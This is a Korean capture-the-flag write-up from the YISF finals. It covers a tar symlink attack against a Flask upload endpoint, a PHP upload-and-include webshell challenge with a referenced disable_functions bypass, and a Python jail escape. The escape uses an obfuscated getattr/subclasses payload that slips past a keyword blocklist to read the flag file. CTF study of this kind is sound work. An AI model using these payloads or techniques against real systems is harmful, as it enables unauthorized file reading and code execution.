---
title: yisf-finals-writeup
published: 2024-10-20
description: "yisf finals writeup"
image: ""
tags: [yisf, writeup]
category: "writeup"
draft: true
lang: "ko"
---

# Solved

## BubbleTea

tar파일이 압축 해제될 때 symbolic link 취약점이 발생한다.

```py
# app.py
@app.route('/api/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']

    if "uid" not in session:
        session["uid"] = str(uuid.uuid4())
    uid = session["uid"]

    remove_expired_files()
    user_folder = os.path.join(app.config['UPLOAD_FOLDER'], uid)
    os.makedirs(user_folder, exist_ok=True)

    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file_path = os.path.join(user_folder, filename)
        file.save(file_path)

        try:
            if tarfile.is_tarfile(file_path):
                with tarfile.open(file_path, 'r') as tar:
                    tar.extractall(path=user_folder) # ! 취약함
                os.remove(file_path)
            return redirect('/')
        except tarfile.TarError as e:
            return jsonify({'error': str(e)}), 400
    return jsonify({'error': 'File type not allowed'}), 400
```

```docker
FROM python:3.11-alpine

RUN pip install --upgrade pip
# RUN pip install Flask
ENV TZ Asia/Seoul

COPY ./requirements.txt ./
RUN pip install --no-cache-dir -r requirements.txt

WORKDIR /chal

COPY flag ./
COPY ./src/ /chal/

EXPOSE 8000

CMD ["python3", "app.py"]
```

플래그는 /chal/flag에 있고, 서버는 /chal/app.py에 있다.

```sh
ln -s /chal/flag flag.txt
tar -cvf ex.tar flag.txt
```

symbolic link를 생성한 후 압축해주면 된다.

## Anyone can do it

솔브코드를 더럽게 짜고, 이상하게 풀어서 안 쓴다.

`YISF{7h3_3nd_0f_7h3_b451c_f1r57_qu35710n}`

## WEIRD_FILE_UPLOAD

```php
# index.php
<?php
$seedFile = "/seed.txt";
$uploadDir = "./uploads/";
$maxFileSize = 10000;

$seed = file_get_contents($seedFile);
mt_srand($seed);
$randomValue = mt_rand();

function displayMessage($message)
{
    echo "<div class='message success'>$message</div>";
}

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!empty($_FILES["file"]["name"]) && $_FILES["file"]["size"] <= $maxFileSize && strpos($_FILES["file"]["name"], "..") === false) {
        $ip = $_SERVER['REMOTE_ADDR'];

        $hash = hash('sha256', $randomValue . $ip);
        $newFilename = $hash . "_" . basename($_FILES["file"]["name"]);
        $uploadFile = $uploadDir . $newFilename;

        if (move_uploaded_file($_FILES["file"]["tmp_name"], $uploadFile)) {
            displayMessage("Your cosmic anomaly has been absorbed into our bizarre dimension!");
        }
    }
} elseif (isset($_GET["try"])) {
    $path = "./uploads/" . $_GET["try"];
    if (strpos($path, "..") === false) {
        include $path;
    }
}
?>
```

post라면 file upload를 get이라면 webshell을 실행시킬 수 있다.

seed가 /seed.txt에 고정되어 저장되어 있다.
`mt_srand($seed)`에서 srand를 정해주기 때문에 이것도 고정된다.
$randomValue도 일정하다.

**strpos($path, "..")**를 통해 관리하고, prefix가 있으므로 path traversal에 대해서는 안전하다.
근데 4000자 정도의 이름을 파일 이름으로 하면 에러가 나오면서 파일이름을 출력한다.

```docker
CMD while true; do find /var/www/html/uploads/ -mindepth 1 -delete; sleep 10s; done & \
    apache2-foreground
```

./uploads의 파일을 10초마다 삭제하고 있으므로 ~~스크립트를 작성~~ 할 필요 없이 손으로 빠르게 해주면 된다.

```php
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,
    curl_exec,curl_multi_exec,parse_ini_file,show_source,
    pcntl_exec,eval,assert,create_function,mail,copy,
    putenv,preg_replace,imageftbbox,bindtextdomain,
    chmod,opendir,readdir,readlink,stream_socket_server,
    fsocket,chroot,chgrp,chown,proc_get_status,
    ini_alter,ini_restore,openlog,fread,fgets,file,
    readfile,fpassthru,fputs,set_time_limit,ini_set,
    pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,
    pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,
    pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,
    pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,
    pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,
    pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,
    pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,
    symlink,link,syslog,imap_open,ld,error_log,dl,imap_mail

allow_url_include = Off
allow_url_fopen = Off
session.upload_progress.enabled = Off
stream.wrapper.compress.zlib = Off
stream.wrapper.phar = Off
```

그러나 php.ini에서 disable_functions를 통해 막아주고 있다.
상당히 well-known이므로 github애서 검색해서 풀어준다.
물론 poc 코드는 pwn이라 이해를 안했다.

`YISF{F11e_upl0Ader_1N_w0nderl4Nd}`

**Reference**
[Web: Upload Fun](https://ctftime.org/writeup/38824)
[php 7.3 disable_functions bypass](https://github.com/mm0r1/exploits/tree/master/php-concat-bypass)

# Upsolving

<details>
<summary>filter</summary>

```py
banned = [
    "exec",
    "eval",
    "G41V6!4",
    "pickle",
    "input",
    "banned",
    "YISF",
    "subclasses",
    "__",
    "class",
    "base",
    "mro",
    "init",
    "globals",
    "system",
    "sh",
    "getattribute",
    "getitem",
    "cat",
    "flag",
    "replace",
    "[",
    "]"
]

targets = [
    '__name__',
    '__doc__',
    '__package__',
    '__loader__',
    '__spec__',
    '__build_class__',
    '__import__',
    'abs',
    'all',
    'any',
    'ascii',
    'bin',
    'breakpoint',
    'callable',
    'chr',
    'compile',
    'delattr',
    'dir',
    'divmod',
    'eval',
    'format',
    'globals',
    'hasattr',
    'hash',
    'hex',
    'id',
    'isinstance',
    'issubclass',
    'iter',
    'aiter',
    'len',
    'locals',
    'max',
    'min',
    'next',
    'anext',
    'oct',
    'ord',
    'pow',
    'repr',
    'round',
    'setattr',
    'sorted',
    'sum',
    'vars',
    'None',
    'Ellipsis',
    'NotImplemented',
    'False',
    'True',
    'bool',
    'memoryview',
    'bytearray',
    'bytes',
    'classmethod',
    'complex',
    'dict',
    'enumerate',
    'filter',
    'float',
    'frozenset',
    'property',
    'int',
    'list',
    'map',
    'object',
    'range',
    'reversed',
    'set',
    'slice',
    'staticmethod',
    'str',
    'super',
    'tuple',
    'type',
    'zip',
    '__debug__',
    'BaseException',
    'Exception',
    'TypeError',
    'StopAsyncIteration',
    'StopIteration',
    'GeneratorExit',
    'KeyboardInterrupt',
    'ImportError',
    'ModuleNotFoundError',
    'OSError',
    'EnvironmentError',
    'IOError',
    'EOFError',
    'RuntimeError',
    'RecursionError',
    'NotImplementedError',
    'NameError',
    'UnboundLocalError',
    'AttributeError',
    'SyntaxError',
    'IndentationError',
    'TabError',
    'LookupError',
    'IndexError',
    'KeyError',
    'ValueError',
    'UnicodeError',
    'UnicodeEncodeError',
    'UnicodeDecodeError',
    'UnicodeTranslateError',
    'AssertionError',
    'ArithmeticError',
    'FloatingPointError',
    'OverflowError',
    'ZeroDivisionError',
    'SystemError',
    'ReferenceError',
    'MemoryError',
    'BufferError',
    'Warning',
    'UserWarning',
    'EncodingWarning',
    'DeprecationWarning',
    'PendingDeprecationWarning',
    'SyntaxWarning',
    'RuntimeWarning',
    'FutureWarning',
    'ImportWarning',
    'UnicodeWarning',
    'BytesWarning',
    'ResourceWarning',
    'ConnectionError',
    'BlockingIOError',
    'BrokenPipeError',
    'ChildProcessError',
    'ConnectionAbortedError',
    'ConnectionRefusedError',
    'ConnectionResetError',
    'FileExistsError',
    'FileNotFoundError',
    'IsADirectoryError',
    'NotADirectoryError',
    'InterruptedError',
    'PermissionError',
    'ProcessLookupError',
    'TimeoutError',
    'open',
    'quit',
    'copyright',
    'credits',
    'license',
    'help'
]
```

</details>

```py
# prob.py
for x in targets:
    del __builtins__.__dict__[x]

print("Input EvreyThing!")
e = input("> ")
for ban in banned:
    if ban.lower() in e.lower():
        print("No Way~")
        exit()
exec(e)
```

상당히 ~~더러운~~ 재밌는 문제이다.
getattr을 사용해서 우회한다.

```py
(a:=getattr(getattr(getattr((),'_'+'_cla'+'ss_'+'_'),'_'+'_ba'+'se_'+'_'),'_'+'_su'+'bcl'+'asses_'+'_')())and (b:=a.pop(146)) and (c:=getattr(getattr(b,'_'+'_cl'+'ass_'+'_').register,'_'+'_bui'+'ltins_'+'_')) and print(c.get('ex'+'ec')(''))
(a:=getattr(getattr(getattr((),'_'+'_cla'+'ss_'+'_'),'_'+'_ba'+'se_'+'_'),'_'+'_su'+'bcl'+'asses_'+'_')())and (b:=a.pop(129)) and (c:=getattr(b,'_'+'_'+'s'+'u'+'b'+'c'+'l'+'a'+'s'+'s'+'e'+'s'+'_'+'_')().pop(2)) and (d:=getattr(c,'_'+'_'+'s'+'u'+'b'+'c'+'l'+'a'+'s'+'s'+'e'+'s'+'_'+'_')().pop(0)('fl'+'ag').read()) and print(d)
```

2번째가 페이로드 이다.
본선 끝나고 바로 풀어서 아쉽다.

나중에 자동화 도구도 만들까 생각중이다.
python ssti chain generator...?

## Letter Sender

(예정)
